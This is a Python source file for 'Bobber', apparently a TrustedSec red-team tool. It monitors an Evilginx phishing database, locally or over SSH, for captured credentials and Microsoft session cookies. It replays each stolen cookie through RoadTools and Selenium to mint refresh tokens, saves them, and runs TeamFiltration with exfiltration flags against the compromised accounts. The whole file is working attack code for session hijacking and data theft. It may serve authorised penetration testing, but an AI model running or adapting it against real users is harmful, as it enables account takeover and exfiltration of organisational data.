import subprocess
import os
import argparse
import paramiko
import threading
import time
import json
import codecs
import platform
import sys
import requests
from colorama import init, Fore
from concurrent.futures import ThreadPoolExecutor

from selenium import webdriver
from seleniumwire import webdriver as webdriver_wire

# Import only necessary modules from roadtools.roadlib
from roadtools.roadlib.auth import Authentication
from roadtools.roadlib.deviceauth import DeviceAuthentication
from roadtools.roadtx.selenium import SeleniumAuthentication

# Initialize colorama for colored output
init(autoreset=True)

# Define log icons
INFO_ICON = Fore.CYAN + "[INFO] "
SUCCESS_ICON = Fore.GREEN + "[SUCCESS] "
ERROR_ICON = Fore.RED + "[ERROR] "
WARNING_ICON = Fore.YELLOW + "[WARNING] "

# Initialize the Pushover client to send notifications
pushClient = None

class PushoverClient:
    def __init__(self, user_key, api_token):
        self.user_key = user_key
        self.api_token = api_token

    def send_message(self, message, title=None):
        try:
            data = {
                "token": self.api_token,
                "user": self.user_key,
                "message": message
            }
            if title:
                data["title"] = title
            response = requests.post("https://api.pushover.net/1/messages.json", data=data)
            if response.status_code == 200:
                print(SUCCESS_ICON + "Pushover notification sent successfully!")
            else:
                print(ERROR_ICON + f"Failed to send notification, Status Code: {response.status_code} , Response: {response.text}")
        except Exception as e:
             print(ERROR_ICON + f"Failed to send notification {e}")

class LazySeleniumAuthentication(SeleniumAuthentication):

    def get_webdriver(self, service, intercept=False):
        '''
        Updated / Override to ignore TLS error issues
        Load webdriver based on service, which is either
        from selenium or selenium-wire if interception is requested
        '''

        options = {'request_storage': 'memory'}
        if intercept and self.headless:
            firefox_options=self.FirefoxOptions()
            firefox_options.add_argument("-headless")
            driver = webdriver_wire.Firefox(service=service,  options=firefox_options, seleniumwire_options=options)
        elif intercept:
            seleniumwireOptions = {}
            seleniumwireOptions['desired_capabilities'] = {
                'acceptInsecureCerts': True
            }
            driver = webdriver_wire.Firefox(service=service, seleniumwire_options=seleniumwireOptions)
        else:
            driver = webdriver.Firefox(service=service)
        return driver

    

def is_teamfiltration_present():
    binary_name = "TeamFiltration"
    if platform.system() == "Windows":
        binary_name += ".exe"
    
    if os.path.isfile(binary_name) and os.access(binary_name, os.X_OK):
        return True
    
    system_path = os.environ.get("PATH", "")
    
    for directory in system_path.split(os.pathsep):
        binary_path = os.path.join(directory, binary_name)
        if os.path.isfile(binary_path) and os.access(binary_path, os.X_OK):
            return True
    
    return False

def extract_valid_jsons(filename):
    with open(filename, 'r') as file:
        lines = file.readlines()

    valid_jsons = []

    for line in lines:
        try:
            parsed_json = json.loads(line.strip())
            valid_jsons.append(parsed_json)
        except json.JSONDecodeError:
            # Ignore the line if it's not a valid JSON
            pass

    return valid_jsons

def is_gecko_driver_present(geckoDriverPath):
        selauth = LazySeleniumAuthentication(None, None, None, None)
        service = selauth.get_service(geckoDriverPath)
        if not service:
            return False
        return True

def get_remote_file_mtime(ssh, remote_file):
    sftp = ssh.open_sftp()
    remote_file_stat = sftp.stat(remote_file)
    sftp.close()
    return remote_file_stat.st_mtime

def download_remote_file(ssh, remote_file, local_file):
    try:
        sftp = ssh.open_sftp()
        sftp.get(remote_file, local_file)
        sftp.close()
        print(INFO_ICON + f"File '{remote_file}' successfully downloaded as '{local_file}'.")
    except Exception as e:
        print(ERROR_ICON + f"Failed to download file: {e}")

def execute_authentication(estscookie, username, resourceUri, clientId, redirectUrl, geckoDriverPath, keepOpen):
    try:
        print(INFO_ICON + f"Using RoadTools to retrive JWT tokens for {username}")
        deviceauth = DeviceAuthentication()
        auth = Authentication()

        auth.set_client_id(clientId)
        auth.set_resource_uri(resourceUri)
        auth.verify =  False
        deviceauth.verify = False
        auth.tenant = None
        selauth = LazySeleniumAuthentication(auth, deviceauth, redirectUrl, None)
       

        url = auth.build_auth_url(redirectUrl, 'code', None)

        service = selauth.get_service(geckoDriverPath)
        if not service:
            return

        selauth.driver = selauth.get_webdriver(service, intercept=True)
        
        # def selenium_login_with_estscookie(self, url, identity=None, password=None, otpseed=None, keep=False, capture=False, estscookie=None):
        tokendata = selauth.selenium_login_with_estscookie(url, None, None, None, keepOpen, False, estscookie=estscookie)
  
        refreshToken = tokendata["refreshToken"]
        print(SUCCESS_ICON + f"Got Refresh token: {refreshToken[:30]}....")
        
        safeUserName = username.replace('@','_')
        safeUserName = safeUserName.replace('.','_')
        outfilePath = f"{safeUserName}_roadtools_auth"
        with codecs.open(outfilePath, 'w', 'utf-8') as outfile:
            json.dump(tokendata, outfile)
        print(INFO_ICON + f'Tokens were written to {outfilePath}')
    
        if is_teamfiltration_present():
            binary_name = "TeamFiltration"
            if platform.system() == "Windows":
                binary_name += ".exe"
            process = subprocess.Popen(f"{binary_name} --outpath {safeUserName} --exfil --all  --roadtools {outfilePath}",  stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
            # Display the output as it is generated
            while True:
                output = process.stdout.readline()
                if output == '' and process.poll() is not None:
                    break
                if output:
                    print(output.strip())
            # Capture any remaining output
            stdout, stderr = process.communicate()
            if stdout:
                print(stdout.strip())
            if stderr:
                print(stderr.strip(), file=sys.stderr)

    except Exception as e:
        print(ERROR_ICON + f"Authentication error: {e}")

def process_combinations(valid_json_objects, processed_combinations):
    unique_combinations = {}

    for obj in valid_json_objects:
        try:
            username = obj.get("username", "")
            password = obj.get("password", "")
            if username and password:
                tokens = obj.get("tokens", {})
                for token in tokens.values():
                    #This can be updated and/changed to hit another or multiple cookies
                    tokenData = token.get("ESTSAUTHPERSISTENT", {}).get("Value", "")
                    if tokenData:
                        key = f"{username}:{password}"
                        if key not in processed_combinations:
                            unique_combinations[key] = tokenData
                            print(SUCCESS_ICON + f"Found session with captured cookie for : {username}")
                            processed_combinations.add(key)
                            
                            if pushClient is not None:
                                pushClient.send_message(
                                    f"A set of credentials and session cookies have been captured for the user {username}"
                                    , title="Bobber alert, new session!")
        except Exception as e:
            pass

    return unique_combinations


def monitor_remote_database(remote_info, processed_combinations, args):
    with paramiko.SSHClient() as ssh:
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(remote_info['host'], port=remote_info['port'], username=remote_info['username'], password=remote_info['password'], key_filename=remote_info['key'])
        except paramiko.AuthenticationException:
            print(ERROR_ICON + "SSH authentication failed. Please check your credentials.")
            return
        except paramiko.SSHException as e:
            print(ERROR_ICON + f"SSH error: {e}")
            return

        previous_mtime = None

        local_file = f"{remote_info['host'].replace('.', '_')}_{os.path.basename(remote_info['remote_path'])}"

        while True:
            try:
                sftp = ssh.open_sftp()
                remote_file_stat = sftp.stat(remote_info['remote_path'])
                sftp.close()

                if previous_mtime is None or remote_file_stat.st_mtime > previous_mtime:
                    previous_mtime = remote_file_stat.st_mtime
                 
                    download_remote_file(ssh, remote_info['remote_path'], local_file)
                    valid_json_objects = extract_valid_jsons(local_file)
                    new_combinations = process_combinations(valid_json_objects, processed_combinations)
                    for key, tokenData in new_combinations.items():
                        with ThreadPoolExecutor() as executor:
                            executor.submit(execute_authentication, tokenData, key.split(':')[0], args.resource, args.client, args.redirect_url, args.driver_path, args.keep_open)
                          
            except Exception as e:
                print(ERROR_ICON + f"Error monitoring remote file: {e}")

            time.sleep(5)

if __name__ == "__main__":
    # ASCII Banner
    banner = """                                        
                                         ▓▓                                                         
                                         ▓▓▓                                                        
                                          ▓▓                                                        
                                          ▓▓▓                                                       
                                           ▓▓                                                       
                                           ▓▓▓                                                      
                                            ▓▓                                                      
                                            ▓▓▓                                                     
                                             ▓▓                                                     
                                             ▓▓▓                                                    
                           ░░░░░░░░░░░░░░░░░░█▓▓▓▓▓░░░░░░░░░░░░░                                    
                 ░░░░░░░░                   ▓▓▓█▓▓▓▓▓             ░░░░░░░░                          
           ░░░░░░             ░░░░░░░░░░░░░▓▓▓▓▓▓█▓█▓▓▓░░░░░░             ░░░░░░                    
      ░░░░░░          ░░░░░░               ▓▓█▓▓▓▓▓▓▓▓▓▓       ░░░░░░           ░░░░░               
   ░░░░░         ░░░░░           ░░░░░░░░░░▓▓▓▓█▓▓▓▓█▓▓▓░░           ░░░░░         ░░░░░            
 ░░░░░        ░░░░░         ░░░░░          ▓█▓▓▓▓█▓▓▓▓█▓▓ ░░░░░         ░░░░░        ░░░░░          
░░░░░        ░░░░        ░░░░░          ░░░▒▓▓▓▓▓▓▓▓█▓▓▓▓    ░░░░░        ░░░░        ░░░░░         
░░░░        ░░░░░        ░░░░          ░░░ ▒▒▒▒▒▒▒▒▒▒▒▒▒▒     ░░░░        ░░░░░        ░░░░       
 ░░░░        ░░░░░        ░░░░░         ░░░░░▒▒▒▒▒▒▒▒▒▒▒  ░░░░░░         ░░░░░        ░░░░      
  ░░░░░        ░░░░░         ░░░░            ░░░░░░         ░░░░░        ░░ 
    ░░░░░         ░░░░░           ░░░░░░░░        ░░░░░░░░           ░░░░░         ░░░   
                                                                        
                                Bobber - Bounces when a fish bites!
                                v0.1 @flangvik @TrustedSec
                                Uses RoadTools by @_dirkjan
    """
    print(Fore.CYAN + banner)

    parser = argparse.ArgumentParser(description="Evilginx database location")
    parser.add_argument("database_path", help="Path to the local OR remote Evilginx database file.")

    ssh_group = parser.add_argument_group('SSH Options', 'Options for fetching the Evilginx database from a remote host via SSH')
    ssh_group.add_argument("--host", help="SSH hostname/IP when fetching from a remote host.")
    ssh_group.add_argument("--port", type=int, default=22, help="SSH port when fetching from a remote host.")
    ssh_group.add_argument("--username", help="SSH username when fetching from a remote host.", default="root")
    ssh_group.add_argument("--password", help="SSH password when fetching from a remote host.", required=False)
    ssh_group.add_argument("--key", default=os.path.expanduser("~/.ssh/id_rsa"), help="Path to the SSH private key file for authentication.")

    pushover_group = parser.add_argument_group('Pushover Options', 'Options for sending Pushover notifications')
    pushover_group.add_argument('--user-key', type=str, required=False, help='Pushover User Key')
    pushover_group.add_argument('--api-token', type=str, required=False, help='Pushover API Token')

    intauth_group = parser.add_argument_group('RoadTools Options', description='Options for the interactive authentication Selenium flow from RoadTools roadtx')
    intauth_group.add_argument('-c',
                                '--client',
                                action='store',
                                help="Client ID (application ID / GUID ) to use when authenticating (Teams Client by default)",
                                default='1fec8e78-bce4-4aaf-ab1b-5451cc387264')
    intauth_group.add_argument('-r',
                                '--resource',
                                action='store',
                                help='Resource to authenticate to. Either a full URL or alias (list with roadtx listaliases)',
                                default='https://graph.windows.net')
    intauth_group.add_argument('-s',
                                '--scope',
                                action='store',
                                help='Scope to use. Will automatically switch to v2.0 auth endpoint if specified. If unsure use -r instead.')
    intauth_group.add_argument('-ru', '--redirect-url', action='store', metavar='URL',
                                help='Redirect URL used when authenticating (default: https://login.microsoftonline.com/common/oauth2/nativeclient)',
                                default="https://login.microsoftonline.com/common/oauth2/nativeclient")
    intauth_group.add_argument('-t',
                                '--tenant',
                                action='store',
                                help='Tenant ID or domain to auth to',
                                required=False)
    intauth_group.add_argument('-d', '--driver-path',
                                action='store',
                                help='Path to geckodriver file on disk (download from: https://github.com/mozilla/geckodriver/releases)',
                                default='geckodriver.exe')
    intauth_group.add_argument('-k', '--keep-open',
                                action='store_true',
                                help='Do not close the browser window after timeout. Useful if you want to browse online apps with the obtained credentials')
    
    args = parser.parse_args()
    processed_combinations = set()

    if not is_gecko_driver_present(args.driver_path):
        exit(0)
    
    if args.user_key and args.api_token:
        pushover_configured=True
        pushClient = PushoverClient(args.user_key, api_token=args.api_token)
        print(INFO_ICON + "Pushover notifications activated!")

    if args.host:
        remote_info = {
            'host': args.host,
            'port': args.port,
            'username': args.username,
            'password': args.password,
            'key': args.key,
            'remote_path': args.database_path
        }
        print(INFO_ICON + "SSH is enabled for remote database access. Starting to monitor the remote database file...")
        monitor_remote_database(remote_info, processed_combinations, args)
    else:
        print(INFO_ICON + f"SSH is not enabled. Monitoring local database file {args.database_path}")
        while True:
            valid_json_objects = extract_valid_jsons(args.database_path)
            initial_combinations = process_combinations(valid_json_objects, processed_combinations)
            for key, tokenData in initial_combinations.items():
                with ThreadPoolExecutor() as executor:
                    executor.submit(execute_authentication, tokenData, key.split(':')[0], args.resource, args.client, args.redirect_url, args.driver_path, args.keep_open)
            #time.sleep(10000)
